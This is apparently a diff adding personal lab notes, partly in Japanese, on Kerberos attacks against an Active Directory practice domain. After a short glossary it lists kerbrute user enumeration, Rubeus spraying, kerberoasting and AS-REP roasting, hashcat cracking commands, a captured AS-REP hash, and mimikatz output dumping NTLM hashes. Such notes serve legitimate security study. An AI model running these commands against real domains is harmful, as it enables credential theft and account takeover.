@@ -1,0 +1,72 @@
+# keywords
+- Ticket Granting Ticket (TGT)
+  - 自分の証明書
+
+- Key Distribution Center (KDC)
+  - 親玉
+  - AS,TGSで構成
+
+- Authentication Service (AS) 
+  - 認証するとこ
+  - TGT発行
+
+- Ticket Granting Service (TGS)
+  - TGTで認証
+  - サービスアクセス用のチケット生成 
+
+
+# enum
+- kerbrute
+  - url
+    - https://github.com/ropnop/kerbrute/releases
+  - user
+    - https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt
+```
+chmod +x kerbrute
+
+./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
+```
+
+
+# Rybeus
+- https://github.com/GhostPack/Rubeus
+- Rubeus.exe harvest /interval:30
+- Rubeus.exe brute /password:Password1 /noticket
+- Rubeus.exe kerberoast
+- hashcat -m 13100 -a 0 hash.txt Pass.txt
+- Rubeus.exe asreproast
+- hashcat -m 18200 hash.txt Pass.txt
+```
+$krb5asrep$User3@CONTROLLER.local:2342597609456C385E4CB4425B8C9891$7FB3FDFCD80AE80181885115ADEAB8ED9A49D7B75EE041AD8E9B521B22322588004EB4C5544EAD22B563A67E803E9B21CB65B4827DCB306C1F1983CAF28108405BDB5F0F9862A6F2E7924A7895BF9F541A29745757BF5F5870FF56FF129765E55F7FEB2BC93BDB648B840494C1F0360701C0B4AA538C37A29E54002394E8C8E7708B68BDD690BE64807E1B78B50F9F911FD504C30895620FF648DB185E42B3C923094BBB154A8FBB0564F20667E9B26FED62D4E6D59A9B7613787BBA99B4C6ABFB3B7215E46B02B3724BCE92C0B74D70309CA52A5D16972BAA601C0CAF802E1FD671D397AAA68EA892A2717E5CC355B686459A44
+
+add 23$
+$krb5asrep$23$User3@CONTROLLER.local:2342597609456C385E4CB4425B8C9891$7FB3FDFCD80AE80181885115ADEAB8ED9A49D7B75EE041AD8E9B521B22322588004EB4C5544EAD22B563A67E803E9B21CB65B4827DCB306C1F1983CAF28108405BDB5F0F9862A6F2E7924A7895BF9F541A29745757BF5F5870FF56FF129765E55F7FEB2BC93BDB648B840494C1F0360701C0B4AA538C37A29E54002394E8C8E7708B68BDD690BE64807E1B78B50F9F911FD504C30895620FF648DB185E42B3C923094BBB154A8FBB0564F20667E9B26FED62D4E6D59A9B7613787BBA99B4C6ABFB3B7215E46B02B3724BCE92C0B74D70309CA52A5D16972BAA601C0CAF802E1FD671D397AAA68EA892A2717E5CC355B686459A44
+```
+
+```
+C:\Users\Administrator\Downloads>mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # lsadump::lsa /inject /name:admin2
+Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860
+
+RID  : 00000452 (1106)
+User : admin2
+
+ * Primary
+    NTLM : 46315f382d8f389408872bfd27dcdfd4
+    LM   :
+  Hash NTLM: 46315f382d8f389408872bfd27dcdfd4
+    ntlm- 0: 46315f382d8f389408872bfd27dcdfd4
+    lm  - 0: 08115aec81894059fa20406c047a5fa2
+```
+
